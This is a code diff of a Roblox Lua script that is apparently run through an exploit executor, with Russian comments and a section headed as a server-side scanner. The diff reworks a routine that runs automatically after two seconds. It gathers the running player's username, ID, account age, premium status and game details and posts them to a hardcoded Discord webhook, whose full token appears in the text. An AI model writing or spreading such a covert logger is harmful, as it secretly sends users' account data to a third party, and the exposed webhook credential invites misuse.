@@ -15,21 +15,12 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Debris = game:GetService("Debris")
 
 -- =========================
--- DISCORD WEBHOOK (С ПРОВЕРКОЙ)
+-- DISCORD WEBHOOK (ПРЯМОЙ ВЫЗОВ)
 -- =========================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1512740729603096769/Ti0GBHAx6aqBVw0fRbHuf9e6AIaY3FGSd9YVDbvL7iC24sqOoWZN6uakmDf-zubzPzkn"
 
--- Абсолютно скрытая и безопасная проверка среды через getfenv
-local env = getfenv()
-local requestFunc = env.request or env.http_request
-
-if not requestFunc then
-    -- Проверяем сложные таблицы внутри окружения, если они есть
-    if env.syn and type(env.syn) == "table" then requestFunc = env.syn.request
-    elseif env.http and type(env.http) == "table" then requestFunc = env.http.request
-    elseif env.fluxus and type(env.fluxus) == "table" then requestFunc = env.fluxus.request
-    end
-end
+-- Убираем лишний мусор, вызываем напрямую request среды экзекютера
+local requestFunc = request or http_request
 
 local function SendToDiscord(webhookUrl, data)
     if not requestFunc then
@@ -58,6 +49,7 @@ local function SendToDiscord(webhookUrl, data)
 end
 
 local function GetPlayerInfo()
+    -- Теперь Player объявлен сверху и код не будет падать
     local AccountAge = Player.AccountAge
     local UserID = Player.UserId
     local DisplayName = Player.DisplayName
@@ -82,8 +74,8 @@ local function GetGameInfo()
         GameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
     end)
     
-    local Players = #game.Players:GetPlayers()
-    local MaxPlayers = game.Players.MaxPlayers
+    local Players = #PlayersService:GetPlayers()
+    local MaxPlayers = PlayersService.MaxPlayers
     
     return {
         GameName = GameName,
@@ -110,7 +102,8 @@ local function CreateDiscordEmbed()
                 {
                     ["name"] = "👤 Player Information",
                     ["value"] = string.format(
-                        "```\nUsername: %s\nDisplay: %s\nID: %s\nAge: %d days\nPremium: %s\n```",
+                        "```\nUsername: %s\nDisplay: %s\nID: %s\nAge: %d days\nPremium: %s\n
+```",
                         playerInfo.Username,
                         playerInfo.DisplayName,
                         playerInfo.UserID,
@@ -141,8 +134,8 @@ local function CreateDiscordEmbed()
     return embed
 end
 
-spawn(function()
-    wait(2)
+task.spawn(function()
+    task.wait(2)
     if requestFunc and WEBHOOK_URL ~= "YOUR_WEBHOOK_URL_HERE" then
         local embedData = CreateDiscordEmbed()
         SendToDiscord(WEBHOOK_URL, embedData)
@@ -150,7 +143,6 @@ spawn(function()
         print("⚠️ Discord Webhook disabled or not configured")
     end
 end)
-
 -- =========================
 -- SERVERSIDE СКАНЕР
 -- =========================
